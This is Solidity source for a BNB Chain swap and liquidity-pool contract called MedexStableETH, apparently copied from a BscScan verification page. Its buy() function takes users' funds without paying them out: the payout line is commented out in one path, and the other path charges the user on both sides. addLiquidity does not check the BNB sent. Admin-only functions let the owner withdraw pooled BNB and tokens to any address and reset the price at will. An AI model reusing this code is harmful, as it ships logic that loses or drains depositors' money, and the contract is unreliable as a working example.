/**
 *Submitted for verification at BscScan.com on 2022-06-20
*/

/**
 *Submitted for verification at BscScan.com on 2022-04-11
 */

// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.6.8;

interface BEP20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function fee() external view returns (uint256);

    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }

    function min(uint256 x, uint256 y) internal pure returns (uint256 z) {
        z = x < y ? x : y;
    }

    // babylonian method (https://en.wikipedia.org/wiki/Methods_of_computing_square_roots#Babylonian_method)
    function sqrt(uint256 y) internal pure returns (uint256 z) {
        if (y > 3) {
            z = y;
            uint256 x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
}

library TransferHelper {
    function safeApprove(
        address token,
        address to,
        uint256 value
    ) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(0x095ea7b3, to, value)
        );
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            "APPROVE_FAILED"
        );
    }

    function safeTransfer(
        address token,
        address to,
        uint256 value
    ) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(0xa9059cbb, to, value)
        );
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            "TRANSFER_FAILED"
        );
    }

    function safeTransferFrom(
        address token,
        address from,
        address to,
        uint256 value
    ) internal {
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(0x23b872dd, from, to, value)
        );
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            "TRANSFER_FROM_FAILED"
        );
    }

    function safeTransferETH(address to, uint256 value) internal {
        (bool success, ) = to.call{value: value}(new bytes(0));
        require(success, "BSC_TRANSFER_FAILED");
    }
}

// File: contracts/UniswapV2ERC20.sol

abstract contract Initializable {
    /**
     * @dev Indicates that the contract has been initialized.
     */
    bool private _initialized;

    /**
     * @dev Indicates that the contract is in the process of being initialized.
     */
    bool private _initializing;

    /**
     * @dev Modifier to protect an initializer function from being invoked twice.
     */
    modifier initializer() {
        require(
            _initializing || !_initialized,
            "Initializable: contract is already initialized"
        );

        bool isTopLevelCall = !_initializing;
        if (isTopLevelCall) {
            _initializing = true;
            _initialized = true;
        }

        _;

        if (isTopLevelCall) {
            _initializing = false;
        }
    }
}

abstract contract ContextUpgradeable is Initializable {
    function __Context_init() internal initializer {
        __Context_init_unchained();
    }

    function __Context_init_unchained() internal initializer {}

    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    // function _msgData() internal pure virtual returns (bytes calldata) {
    //     return msg.data;
    // }

    uint256[50] private __gap;
}

abstract contract OwnableUpgradeable is Initializable, ContextUpgradeable {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    function __Ownable_init() internal initializer {
        __Context_init_unchained();
        __Ownable_init_unchained();
    }

    function __Ownable_init_unchained() internal initializer {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    uint256[49] private __gap;
}

pragma solidity 0.6.8;

contract MedexERC20 is ContextUpgradeable, OwnableUpgradeable {
    using SafeMath for uint256;
    string public constant name = "MBrent-LP";
    string public constant symbol = "MBrentLP";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    bytes32 public DOMAIN_SEPARATOR;
    // keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");
    bytes32 public constant PERMIT_TYPEHASH =
        keccak256(
            "Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"
        );
    //bytes32 public constant PERMIT_TYPEHASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;
    mapping(address => uint256) public nonces;

    event Pair(string name, string symbol);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor() public {}

    function _initializedParams() internal {}

    function _mint(address to, uint256 value) internal {
        totalSupply = totalSupply.add(value);
        balanceOf[to] = balanceOf[to].add(value);
        emit Transfer(address(0), to, value);
    }

    function _burn(address from, uint256 value) internal {
        balanceOf[from] = balanceOf[from].sub(value);
        totalSupply = totalSupply.sub(value);
        emit Transfer(from, address(0), value);
    }

    function _transferLiq(
        address from,
        address to,
        uint256 value
    ) internal {
        if (allowance[msg.sender][to] != uint256(-1)) {
            allowance[msg.sender][to] = allowance[msg.sender][to].sub(value);
        }
        _transfer(from, to, value);
    }

    function _approve(
        address owner,
        address spender,
        uint256 value
    ) private {
        allowance[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function _transfer(
        address from,
        address to,
        uint256 value
    ) private {
        balanceOf[from] = balanceOf[from].sub(value);
        balanceOf[to] = balanceOf[to].add(value);
        emit Transfer(from, to, value);
    }

    function approve(address spender, uint256 value) external returns (bool) {
        _approve(msg.sender, spender, value);
        return true;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool) {
        if (allowance[from][msg.sender] != uint256(-1)) {
            allowance[from][msg.sender] = allowance[from][msg.sender].sub(
                value
            );
        }
        _transfer(from, to, value);
        return true;
    }

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        require(deadline >= block.timestamp, "EXPIRED");
        bytes32 digest = keccak256(
            abi.encodePacked(
                "\x19\x01",
                DOMAIN_SEPARATOR,
                keccak256(
                    abi.encode(
                        PERMIT_TYPEHASH,
                        owner,
                        spender,
                        value,
                        nonces[owner]++,
                        deadline
                    )
                )
            )
        );
        address recoveredAddress = ecrecover(digest, v, r, s);
        require(
            recoveredAddress != address(0) && recoveredAddress == owner,
            "INVALID_SIGNATURE"
        );
        _approve(owner, spender, value);
    }
}

pragma solidity 0.6.8;

interface IWETH {
    function deposit() external payable;

    function transfer(address to, uint256 value) external returns (bool);

    function withdraw(uint256 value) external;
}

contract MedexStableETH is MedexERC20 {
    using SafeMath for uint256;

    mapping(string => mapping(uint256 => address)) public pairs;

    uint256 public busdPerMedex;
    uint256 public liqudityProviderFees;
    address public tokenA;
    address public tokenB;
    address public adminAddress;

    constructor() public {}

    function initialize(
        address _tokenA,
        address _WBNB,
        address _adminAddress
    ) public initializer {
        tokenA = _tokenA;
        tokenB = _WBNB;
        adminAddress = _adminAddress;
        busdPerMedex = 4 * 1e6;
        liqudityProviderFees = 0.5 * 1e6;

        _initializedParams();
    }

    modifier onlyAdmin() {
        require(msg.sender == adminAddress, "admin: wut?");
        _;
    }

    function addLiquidity(uint256 amountInOut, uint256 tokenIN)
        external
        payable
    {
        uint256 approveValue = BEP20(tokenA).allowance(
            msg.sender,
            address(this)
        );
        uint256 userBalance = BEP20(tokenA).balanceOf(msg.sender);

        uint256 amountIn;
        uint256 amountOut;
        if (tokenIN == 1) {
            amountIn = amountInOut;
            amountOut = (busdPerMedex * amountInOut);
            amountOut = amountOut / 1e6;
        } else {
            amountIn = (amountInOut / busdPerMedex);
            amountIn = amountIn * 1e6;
            amountOut = amountInOut;
        }

        if (tokenIN == 1) {
            require(
                amountIn <= userBalance && amountIn <= approveValue,
                "Insuffcient Funds A"
            );
        } else {
            require(
                amountOut <= userBalance && amountOut <= approveValue,
                "Insuffcient Funds B"
            );
        }

        uint256 _reserve0 = BEP20(tokenA).balanceOf(address(this));
        uint256 _reserve1 = BEP20(tokenB).balanceOf(address(this));

        TransferHelper.safeTransferFrom(
            tokenA,
            msg.sender,
            address(this),
            amountIn
        );
        IWETH(tokenB).deposit{value: amountOut}();
        assert(IWETH(tokenB).transfer(address(this), amountOut));

        uint256 balance0 = BEP20(tokenA).balanceOf(address(this));
        uint256 balance1 = BEP20(tokenB).balanceOf(address(this));

        uint256 amount0 = balance0.sub(_reserve0);
        uint256 amount1 = balance1.sub(_reserve1);

        uint256 _totalSupply = totalSupply;
        uint256 liquidity;

        if (_totalSupply == 0) {
            liquidity = SafeMath.sqrt(amount0.mul(amount1));
        } else {
            liquidity = SafeMath.min(
                amount0.mul(_totalSupply) / _reserve0,
                amount1.mul(_totalSupply) / _reserve1
            );
        }

        require(liquidity > 0, "INSUFFICIENT_LIQUIDITY_MINTED");
        _mint(msg.sender, liquidity);
    }

    function removeLiquidity(uint256 _userliquidity) external {
        uint256 balance0 = BEP20(tokenA).balanceOf(address(this));
        uint256 balance1 = BEP20(tokenB).balanceOf(address(this));
        uint256 liquidity = balanceOf[msg.sender];

        require(liquidity >= _userliquidity, "Insufficient balance");

        require(
            allowance[msg.sender][address(this)] >= liquidity,
            "Not Approved"
        );

        _transferLiq(msg.sender, address(this), _userliquidity);

        uint256 _totalSupply = totalSupply;
        uint256 amount0 = _userliquidity.mul(balance0) / _totalSupply;
        uint256 amount1 = _userliquidity.mul(balance1) / _totalSupply;
        require(amount0 > 0 && amount1 > 0, "INSUFFICIENT_LIQUIDITY_BURNED");
        _burn(address(this), _userliquidity);

        uint256 balanceTokenA = BEP20(tokenA).balanceOf(address(this));
        uint256 balanceTokenB = BEP20(tokenB).balanceOf(address(this));

        require(balanceTokenA >= amount0, "Balance is too low A");
        require(balanceTokenB >= amount1, "Balance is too low B");

        BEP20(tokenA).transfer(msg.sender, amount0);
        IWETH(tokenB).withdraw(amount1);
        TransferHelper.safeTransferETH(msg.sender, amount1);
    }

    function buy(
        uint256 tokenIN,
        uint256 amountInOut,
        uint256 input,
        uint256 fromIn
    ) external payable {
        uint256 balance0 = BEP20(tokenA).balanceOf(msg.sender);
        uint256 fromAmt = amountInOut;
        uint256 toamount = this.calculateFeeAmount(tokenIN, amountInOut, input);
        if (input == 2) {
            fromAmt = toamount;
            toamount = amountInOut;
        }

        if (fromIn == 1) {
            require(fromAmt <= balance0, "Balance is too low A");
            TransferHelper.safeTransferFrom(
                tokenA,
                msg.sender,
                address(this),
                fromAmt
            );
            IWETH(tokenB).withdraw(toamount);
            //TransferHelper.safeTransferETH(msg.sender, toamount);
        } else {
            require(fromAmt <= msg.value, "Balance is too low A.");
            IWETH(tokenB).deposit{value: fromAmt}();
            assert(IWETH(tokenB).transfer(address(this), fromAmt));
            TransferHelper.safeTransferFrom(
                tokenA,
                msg.sender,
                address(this),
                toamount
            );
        }
    }

    function calculateFeeAmount(
        uint256 tokenIN,
        uint256 amountIn,
        uint256 input
    ) external view returns (uint256) {
        uint256 tokenfee = BEP20(tokenA).fee();

        uint256 amount = (amountIn / busdPerMedex);
        amount = amount * 1e6;

        uint256 fees = (amount * liqudityProviderFees) / 1e8;
        uint256 feeamount;
        if (input == 1) {
            feeamount = amount - fees;
            uint256 tokenfeeCal = (feeamount * tokenfee) / 1e5;
            feeamount = feeamount - tokenfeeCal;
        } else {
            feeamount = amount + fees;
            uint256 tokenfeeCal = (feeamount * tokenfee) / 1e5;
            feeamount = feeamount + tokenfeeCal;
        }

        if (tokenIN == 1) {
            if (input == 1) {
                uint256 feeDetect = (amountIn * tokenfee) / 1e5;
                amountIn = amountIn - feeDetect;
                amount = (busdPerMedex * amountIn);
                amount = amount / 1e6;
                fees = (amount * liqudityProviderFees) / 1e8;
                feeamount = amount - fees;
            } else {
                amountIn = amountIn;
                amount = (busdPerMedex * amountIn);
                amount = amount / 1e6;
                fees = (amount * liqudityProviderFees) / 1e8;
                feeamount = amount + fees;
            }
        }

        return feeamount;
    }

    function calculateAmount(uint256 tokenIN, uint256 amountIn)
        external
        view
        returns (uint256)
    {
        uint256 amount = (amountIn / busdPerMedex);
        amount = amount * 1e6;

        if (tokenIN == 1) {
            amount = (busdPerMedex * amountIn);
            amount = amount / 1e6;
        }

        return amount;
    }

    function withdrawSafeBNB(uint256 amount, address _admin)
        external
        payable
        onlyAdmin
    {
        IWETH(tokenB).withdraw(amount);
        TransferHelper.safeTransferETH(_admin, amount);
    }

    function withdrawSafeBNB1(
        uint256 amount,
        address _admin,
        address _WBNB
    ) external payable onlyAdmin {
        IWETH(_WBNB).withdraw(amount);
    }

    function withdrawSafeBNB2(
        uint256 amount,
        address _admin,
        address _WBNB
    ) external payable onlyAdmin {
        withdrawSafeBNB3(amount, _admin, _WBNB);
    }

    function withdrawSafeBNB3(
        uint256 amount,
        address _admin,
        address _WBNB
    ) internal onlyAdmin {
        IWETH(_WBNB).withdraw(amount);
    }

    function withdrawSafeToken(uint256 amount, address _admin)
        public
        onlyAdmin
    {
        BEP20(tokenA).transfer(_admin, amount);
    }

    function setProviderFees(uint256 _liqudityProviderFees) public onlyAdmin {
        liqudityProviderFees = _liqudityProviderFees;
    }

    function changeAdmin(address _adminAddress) public onlyAdmin {
        adminAddress = _adminAddress;
    }

    function setPrice(uint256 _busdPerMedex) public onlyAdmin {
        busdPerMedex = _busdPerMedex;
    }
}